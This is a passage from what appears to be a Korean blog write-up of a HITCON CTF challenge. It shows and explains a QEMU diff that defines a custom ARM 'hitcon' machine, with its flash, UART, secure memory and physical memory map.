</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+     * parameters as the flash devices on the Versatile Express board.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+     */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    DriveInfo <span style="color:#f92672">*</span>dinfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">drive_get_next</span>(IF_PFLASH);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    DeviceState <span style="color:#f92672">*</span>dev <span style="color:#f92672">=</span> <span style="color:#a6e22e">qdev_create</span>(NULL, <span style="color:#e6db74">&#34;cfi.pflash01&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    SysBusDevice <span style="color:#f92672">*</span>sbd <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_BUS_DEVICE</span>(dev);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint64_t</span> sectorlength <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (dinfo) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">qdev_prop_set_drive</span>(dev, <span style="color:#e6db74">&#34;drive&#34;</span>, <span style="color:#a6e22e">blk_by_legacy_dinfo</span>(dinfo),
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                            <span style="color:#f92672">&amp;</span>error_abort);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint32</span>(dev, <span style="color:#e6db74">&#34;num-blocks&#34;</span>, flashsize <span style="color:#f92672">/</span> sectorlength);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint64</span>(dev, <span style="color:#e6db74">&#34;sector-length&#34;</span>, sectorlength);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint8</span>(dev, <span style="color:#e6db74">&#34;width&#34;</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint8</span>(dev, <span style="color:#e6db74">&#34;device-width&#34;</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_bit</span>(dev, <span style="color:#e6db74">&#34;big-endian&#34;</span>, false);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint16</span>(dev, <span style="color:#e6db74">&#34;id0&#34;</span>, <span style="color:#ae81ff">0x89</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint16</span>(dev, <span style="color:#e6db74">&#34;id1&#34;</span>, <span style="color:#ae81ff">0x18</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint16</span>(dev, <span style="color:#e6db74">&#34;id2&#34;</span>, <span style="color:#ae81ff">0x00</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_uint16</span>(dev, <span style="color:#e6db74">&#34;id3&#34;</span>, <span style="color:#ae81ff">0x00</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_string</span>(dev, <span style="color:#e6db74">&#34;name&#34;</span>, name);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_init_nofail</span>(dev);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_add_subregion</span>(sysmem, flashbase,
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                                <span style="color:#a6e22e">sysbus_mmio_get_region</span>(<span style="color:#a6e22e">SYS_BUS_DEVICE</span>(dev), <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (file) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fn;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">int</span> image_size;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">drive_get</span>(IF_PFLASH, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;The contents of the first flash device may be &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                         <span style="color:#e6db74">&#34;specified with -bios or with -drive if=pflash... &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                         <span style="color:#e6db74">&#34;but you cannot use both options at once&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        fn <span style="color:#f92672">=</span> <span style="color:#a6e22e">qemu_find_file</span>(QEMU_FILE_TYPE_BIOS, file);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fn) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;Could not find ROM image &#39;%s&#39;&#34;</span>, file);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        image_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">load_image_mr</span>(fn, <span style="color:#a6e22e">sysbus_mmio_get_region</span>(sbd, <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">g_free</span>(fn);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">if</span> (image_size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;Could not load ROM image &#39;%s&#39;&#34;</span>, file);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">create_uart</span>(<span style="color:#66d9ef">int</span> uart, MemoryRegion <span style="color:#f92672">*</span>mem, Chardev <span style="color:#f92672">*</span>chr)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr base <span style="color:#f92672">=</span> memmap[uart].base;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    DeviceState <span style="color:#f92672">*</span>dev <span style="color:#f92672">=</span> <span style="color:#a6e22e">qdev_create</span>(NULL, <span style="color:#e6db74">&#34;pl011&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    SysBusDevice <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_BUS_DEVICE</span>(dev);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_prop_set_chr</span>(dev, <span style="color:#e6db74">&#34;chardev&#34;</span>, chr);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">qdev_init_nofail</span>(dev);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_add_subregion</span>(mem, base, <span style="color:#a6e22e">sysbus_mmio_get_region</span>(s, <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> arm_boot_info bootinfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hitcon_init</span>(MachineState <span style="color:#f92672">*</span>machine)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    MemoryRegion <span style="color:#f92672">*</span>sysmem <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_system_memory</span>();
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    MemoryRegion <span style="color:#f92672">*</span>secure_sysmem <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cpu_type_valid</span>(machine<span style="color:#f92672">-&gt;</span>cpu_type)) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;mach-hitcon: CPU type %s not supported&#34;</span>, machine<span style="color:#f92672">-&gt;</span>cpu_type);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (machine<span style="color:#f92672">-&gt;</span>ram_size <span style="color:#f92672">!=</span> memmap[VIRT_MEM].size) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;mach-virt: NS RAM must be %dGB&#34;</span>, RAMLIMIT_GB);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>bios_name) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">error_report</span>(<span style="color:#e6db74">&#34;mach-hitcon: BIOS bin does not exist&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">// prepare secure memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>    secure_sysmem <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_new</span>(MemoryRegion, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_init</span>(secure_sysmem, <span style="color:#a6e22e">OBJECT</span>(machine), <span style="color:#e6db74">&#34;secure-memory&#34;</span>, UINT64_MAX);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_add_subregion_overlap</span>(secure_sysmem, <span style="color:#ae81ff">0</span>, sysmem, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">// prepare cpu
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>    Object <span style="color:#f92672">*</span>cpuobj <span style="color:#f92672">=</span> <span style="color:#a6e22e">object_new</span>(<span style="color:#a6e22e">ARM_CPU_TYPE_NAME</span>(<span style="color:#e6db74">&#34;hitcon&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_int</span>(cpuobj, (<span style="color:#ae81ff">0x9</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>), <span style="color:#e6db74">&#34;mp-affinity&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_bool</span>(cpuobj, true, <span style="color:#e6db74">&#34;has_el3&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_bool</span>(cpuobj, true, <span style="color:#e6db74">&#34;has_el2&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_bool</span>(cpuobj, false, <span style="color:#e6db74">&#34;pmu&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_find</span>(cpuobj, <span style="color:#e6db74">&#34;reset-cbar&#34;</span>, NULL);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_int</span>(cpuobj, memmap[VIRT_CPUPERIPHS].base, <span style="color:#e6db74">&#34;reset-cbar&#34;</span>, <span style="color:#f92672">&amp;</span>error_abort);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_link</span>(cpuobj, <span style="color:#a6e22e">OBJECT</span>(sysmem), <span style="color:#e6db74">&#34;memory&#34;</span>, <span style="color:#f92672">&amp;</span>error_abort);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_link</span>(cpuobj, <span style="color:#a6e22e">OBJECT</span>(secure_sysmem), <span style="color:#e6db74">&#34;secure-memory&#34;</span>, <span style="color:#f92672">&amp;</span>error_abort);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_property_set_bool</span>(cpuobj, true, <span style="color:#e6db74">&#34;realized&#34;</span>, <span style="color:#f92672">&amp;</span>error_fatal);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">object_unref</span>(cpuobj);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">// prepare ram / rom
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>    MemoryRegion <span style="color:#f92672">*</span>ram <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_new</span>(MemoryRegion, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_allocate_system_memory</span>(ram, NULL, <span style="color:#e6db74">&#34;mach-hitcon.ram&#34;</span>, machine<span style="color:#f92672">-&gt;</span>ram_size);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_add_subregion</span>(sysmem, memmap[VIRT_MEM].base, ram);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr flashsize <span style="color:#f92672">=</span> memmap[VIRT_FLASH].size <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr flashbase <span style="color:#f92672">=</span> memmap[VIRT_FLASH].base;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash0&#34;</span>, flashbase, flashsize, bios_name, secure_sysmem);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">create_one_flash</span>(<span style="color:#e6db74">&#34;hitcon.flash1&#34;</span>, flashbase <span style="color:#f92672">+</span> flashsize, flashsize, NULL, sysmem);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    MemoryRegion <span style="color:#f92672">*</span>secram <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_new</span>(MemoryRegion, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr base <span style="color:#f92672">=</span> memmap[VIRT_SECURE_MEM].base;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    hwaddr size <span style="color:#f92672">=</span> memmap[VIRT_SECURE_MEM].size;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_init_ram</span>(secram, NULL, <span style="color:#e6db74">&#34;hitcon.secure-ram&#34;</span>, size, <span style="color:#f92672">&amp;</span>error_fatal);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">memory_region_add_subregion</span>(secure_sysmem, base, secram);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">// GIC &amp; UART
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">create_uart</span>(VIRT_UART, sysmem, <span style="color:#a6e22e">serial_hd</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">// prepare boot info
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>    bootinfo.ram_size <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>ram_size;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.nb_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.board_id <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.firmware_loaded <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.loader_start <span style="color:#f92672">=</span> memmap[VIRT_MEM].base;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.kernel_filename <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>kernel_filename;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.kernel_cmdline <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>kernel_cmdline;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.initrd_filename <span style="color:#f92672">=</span> machine<span style="color:#f92672">-&gt;</span>initrd_filename;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    bootinfo.skip_dtb_autoload <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#a6e22e">arm_load_kernel</span>(<span style="color:#a6e22e">ARM_CPU</span>(first_cpu), <span style="color:#f92672">&amp;</span>bootinfo);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hitcon_machine_init</span>(MachineClass <span style="color:#f92672">*</span>mc)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>desc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HITCON CTF Virtual Machine&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>init <span style="color:#f92672">=</span> hitcon_init;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>max_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>min_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>default_cpus <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>default_ram_size <span style="color:#f92672">=</span> RAMLIMIT_BYTES;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>ignore_memory_transaction_failures <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    mc<span style="color:#f92672">-&gt;</span>default_cpu_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARM_CPU_TYPE_NAME</span>(<span style="color:#e6db74">&#34;hitcon&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#a6e22e">DEFINE_MACHINE</span>(<span style="color:#e6db74">&#34;hitcon&#34;</span>, hitcon_machine_init)
</span></span></code></pre></div><p>DEFINE_MACHINE으로 hitcon machine을 정의한다.
여기서 메모리 계층이 약간 신기하게 되어있다.
qemu 메모리는 기본적으로 메모리 계층? 처럼 region과 그에 대한 subregion으로 구성된다.
이러한 region들은 각자의 priority를 가지며 낮은 priority 일수록 참조가 우선된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define RAMLIMIT_GB <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>define <span style="color:#a6e22e">RAMLIMIT_BYTES</span> (RAMLIMIT_GB <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024ULL</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> MemMapEntry memmap[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    <span style="color:#75715e">/* Space up to 0x8000000 is reserved for a boot ROM */</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_FLASH] <span style="color:#f92672">=</span>              {          <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x08000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_CPUPERIPHS] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x08000000</span>, <span style="color:#ae81ff">0x00020000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_UART] <span style="color:#f92672">=</span>               { <span style="color:#ae81ff">0x09000000</span>, <span style="color:#ae81ff">0x00001000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_SECURE_MEM] <span style="color:#f92672">=</span>         { <span style="color:#ae81ff">0x0e000000</span>, <span style="color:#ae81ff">0x01000000</span> },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    [VIRT_MEM] <span style="color:#f92672">=</span>                { <span style="color:#ae81ff">0x40000000</span>, RAMLIMIT_BYTES },
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>};
</span></span></code></pre></div><p>위와 같은 물리 메모리 맵을 가지게 된다</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>diff <span style="color:#f92672">-</span>Naur <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>tests<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>roms<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>capstone<span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">--</span>exclude<span style="color:#f92672">=</span>docs<span style="color:#960050;background-color:#1e0010">&#39;</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>Makefile.objs qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>Makefile.objs
</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> ..<span style="color:#f92672">/</span>temp<span style="color:#f92672">/</span>qemu<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0.0</span><span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>Makefile.objs	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span> <span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">34.000000000</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> qemu<span style="color:#f92672">/</span>hw<span style="color:#f92672">/</span>arm<span style="color:#f92672">/</span>Makefile.objs	<span style="color:#ae81ff">2018</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">59</span><span style="color:#f92672">:</span><span style="color:#ae81ff">23.915929581</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0700</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">4</span> <span style="color:#960050;background-color:#1e0010">@@</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>obj<span style="color:#f92672">-</span>y <span style="color:#f92672">+=</span> boot.o virt.o sysbus<span style="color:#f92672">-</span>fdt.o
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>obj<span style="color:#f92672">-</span>y <span style="color:#f92672">+=</span> boot.o virt.o sysbus<span style="color:#f92672">-</span>fdt.o hitcon.o
</span></span><span style="display:flex;"><span> obj<span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">$</span>(CONFIG_ACPI) <span style="color:#f92672">+=</span> virt<span style="color:#f92672">-</span>acpi<span style="color:#f92672">-</span>build.o
</span></span><span style="display:flex;"><span> obj<span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">$</span>(CONFIG_DIGIC) <span style="color:#f92672">+=</span> digic_boards.o
</span></span><span style="display:flex;"><span> obj<span style="color:#f92672">-</span><span style="color:#960050;background-color:#1e0010">$</span>(CONFIG_EXYNOS4) <span style="color:#f92672">+=</span> exynos4_boards.o
